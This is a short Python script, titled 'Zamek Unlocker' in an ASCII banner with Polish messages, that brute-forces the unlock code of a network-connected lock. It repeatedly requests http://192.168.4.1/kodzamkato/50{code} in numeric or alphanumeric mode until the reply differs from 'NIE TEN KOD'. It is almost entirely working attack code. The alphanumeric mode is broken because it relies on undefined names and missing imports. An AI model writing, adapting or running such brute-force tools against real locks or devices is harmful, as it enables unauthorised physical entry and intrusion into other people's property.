import httpx
import time
from colorama import Fore
logo = r'''
 ________  ________  _____ ______   _______   ___  __            ___  ___  ________   ___       ________  ________  ___  __    _______   ________     
|\_____  \|\   __  \|\   _ \  _   \|\  ___ \ |\  \|\  \         |\  \|\  \|\   ___  \|\  \     |\   __  \|\   ____\|\  \|\  \ |\  ___ \ |\   __  \    
 \|___/  /\ \  \|\  \ \  \\\__\ \  \ \   __/|\ \  \/  /|_       \ \  \\\  \ \  \\ \  \ \  \    \ \  \|\  \ \  \___|\ \  \/  /|\ \   __/|\ \  \|\  \   
     /  / /\ \   __  \ \  \\|__| \  \ \  \_|/_\ \   ___  \       \ \  \\\  \ \  \\ \  \ \  \    \ \  \\\  \ \  \    \ \   ___  \ \  \_|/_\ \   _  _\  
    /  /_/__\ \  \ \  \ \  \    \ \  \ \  \_|\ \ \  \\ \  \       \ \  \\\  \ \  \\ \  \ \  \____\ \  \\\  \ \  \____\ \  \\ \  \ \  \_|\ \ \  \\  \| 
   |\________\ \__\ \__\ \__\    \ \__\ \_______\ \__\\ \__\       \ \_______\ \__\\ \__\ \_______\ \_______\ \_______\ \__\\ \__\ \_______\ \__\\ _\ 
    \|_______|\|__|\|__|\|__|     \|__|\|_______|\|__| \|__|        \|_______|\|__| \|__|\|_______|\|_______|\|_______|\|__| \|__|\|_______|\|__|\|__|
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                                                                                                                                                             
'''
mode_num = 0
i = 0

# Generate all combinations and print them
def number_bruteforce():
  global i
  while True:
    kod = int(f'5{i}')
    while True:
      print(f'Próba kodu: {i}')
      try:
        response = httpx.get(f'http://192.168.4.1/kodzamkato/50{kod}')
        break
      except httpx.ConnectTimeout:
        print('Zapytanie przekroczyło czas, Ponawianie próby')
    print(response.text)
    if not response.text == "NIE TEN KOD":
      break
    time.sleep(0.5)
    i += 1

def alpha_bruteforce():
  for i in range(1, len(string) + 1):
      for combination in product(string, repeat=i):
          print(''.join(combination))
          kod = ''.join(combination)
          response = httpx.get(f'http://192.168.4.1/kodzamkato/50{kod}')
          print(response.text)
          if not response.text == "NIE TEN KOD":
            break
          time.sleep(0.5)

def main():
  global mode_num
  print(Fore.RED + logo)
  while not mode_num in [1,2]: 
    mode_num = int(input('''Select mode:
[1] Próba numeryczna
[2] Próba alfanumberyczna'''))
  if mode_num == 1:
    number_bruteforce()

  if mode_num == 2:
    alpha_bruteforce()

if __name__ == '__main__':
  main()